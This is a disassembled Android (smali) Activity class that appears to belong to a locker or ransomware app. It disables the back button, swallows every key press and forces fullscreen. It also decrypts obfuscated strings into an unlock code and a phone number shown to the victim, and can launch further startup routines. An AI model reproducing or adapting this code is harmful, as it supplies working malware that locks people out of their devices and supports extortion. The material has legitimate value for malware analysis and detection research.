.class public Lcom/rt/me/Irt;
.super Landroid/app/Activity;
.source "Irt.java"


# static fields
.field public static opened:I


# instance fields
.field ideaStrin:Lcom/rt/me/IrtStrFunc;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 12
    const/4 v0, 0x0

    sput v0, Lcom/rt/me/Irt;->opened:I

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .prologue
    .line 10
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 11
    new-instance v0, Lcom/rt/me/IrtStrFunc;

    invoke-direct {v0}, Lcom/rt/me/IrtStrFunc;-><init>()V

    iput-object v0, p0, Lcom/rt/me/Irt;->ideaStrin:Lcom/rt/me/IrtStrFunc;

    .line 10
    return-void
.end method


# virtual methods
.method public onBackPressed()V
    .locals 0

    .prologue
    .line 15
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 10
    .param p1, "bundle"    # Landroid/os/Bundle;

    .prologue
    const/16 v9, 0x400

    .line 18
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 19
    const/4 v8, 0x1

    invoke-virtual {p0, v8}, Lcom/rt/me/Irt;->requestWindowFeature(I)Z

    .line 20
    invoke-virtual {p0}, Lcom/rt/me/Irt;->getWindow()Landroid/view/Window;

    move-result-object v8

    invoke-virtual {v8, v9, v9}, Landroid/view/Window;->setFlags(II)V

    .line 21
    const/high16 v8, 0x7f030000

    invoke-virtual {p0, v8}, Lcom/rt/me/Irt;->setContentView(I)V

    .line 22
    new-instance v3, Lcom/rt/me/IrtProgs;

    invoke-direct {v3, p0}, Lcom/rt/me/IrtProgs;-><init>(Landroid/content/Context;)V

    .line 23
    .local v3, "myMe":Lcom/rt/me/IrtProgs;
    const v8, 0x7f070001

    invoke-virtual {p0, v8}, Lcom/rt/me/Irt;->findViewById(I)Landroid/view/View;

    move-result-object v7

    check-cast v7, Landroid/widget/TextView;

    .line 25
    .local v7, "pin":Landroid/widget/TextView;
    new-instance v0, Ljava/lang/String;

    .line 26
    iget-object v8, p0, Lcom/rt/me/Irt;->ideaStrin:Lcom/rt/me/IrtStrFunc;

    .line 27
    const-string v9, "b8040223bcc2d04eb2573cf5740418ffaee4034cb1321f6a2e7cdc26baf886c4139d5e411777efd6a7718830b1e696e9"

    invoke-virtual {v8, v9}, Lcom/rt/me/IrtStrFunc;->irt_deroc(Ljava/lang/String;)[B

    move-result-object v8

    .line 25
    invoke-direct {v0, v8}, Ljava/lang/String;-><init>([B)V

    .line 31
    .local v0, "YourKey":Ljava/lang/String;
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v9

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v9, v3, Lcom/rt/me/IrtProgs;->mykode:Ljava/lang/String;

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Ljava/net/URLDecoder;->decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 33
    .local v6, "okay":Ljava/lang/String;
    new-instance v4, Ljava/lang/String;

    .line 34
    iget-object v8, p0, Lcom/rt/me/Irt;->ideaStrin:Lcom/rt/me/IrtStrFunc;

    const-string v9, "4153f9ce4bee4333d56a24e0171a0f7d"

    invoke-virtual {v8, v9}, Lcom/rt/me/IrtStrFunc;->irt_deroc(Ljava/lang/String;)[B

    move-result-object v8

    .line 33
    invoke-direct {v4, v8}, Ljava/lang/String;-><init>([B)V

    .line 36
    .local v4, "nomer":Ljava/lang/String;
    invoke-virtual {v7, v6}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 37
    const v8, 0x7f070002

    invoke-virtual {p0, v8}, Lcom/rt/me/Irt;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/TextView;

    .line 38
    .local v1, "faq":Landroid/widget/TextView;
    const/high16 v8, 0x7f070000

    invoke-virtual {p0, v8}, Lcom/rt/me/Irt;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/TextView;

    .line 40
    .local v2, "head":Landroid/widget/TextView;
    invoke-static {p0, v4}, Lcom/rt/me/IrtProgs;->jack_give_my_numString(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    .line 41
    .local v5, "ok":Ljava/lang/String;
    invoke-virtual {v1, v5}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 42
    const v8, 0x7f050001

    invoke-virtual {v2, v8}, Landroid/widget/TextView;->setText(I)V

    .line 44
    sget v8, Lcom/rt/me/Starter;->drunded:I

    const/4 v9, 0x5

    if-ne v8, v9, :cond_0

    .line 45
    invoke-static {p0}, Lcom/rt/me/IrtStrFunc;->start(Landroid/content/Context;)V

    .line 47
    :cond_0
    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 1
    .param p1, "keyCode"    # I
    .param p2, "event"    # Landroid/view/KeyEvent;

    .prologue
    .line 66
    invoke-super {p0, p1, p2}, Landroid/app/Activity;->onKeyDown(ILandroid/view/KeyEvent;)Z

    .line 67
    const/4 v0, 0x1

    return v0
.end method

.method public onStart()V
    .locals 1

    .prologue
    .line 55
    invoke-super {p0}, Landroid/app/Activity;->onStart()V

    .line 56
    const/4 v0, 0x1

    sput v0, Lcom/rt/me/Irt;->opened:I

    .line 57
    return-void
.end method

.method protected onStop()V
    .locals 1

    .prologue
    .line 60
    invoke-super {p0}, Landroid/app/Activity;->onStop()V

    .line 61
    const/4 v0, 0x0

    sput v0, Lcom/rt/me/Irt;->opened:I

    .line 62
    return-void
.end method
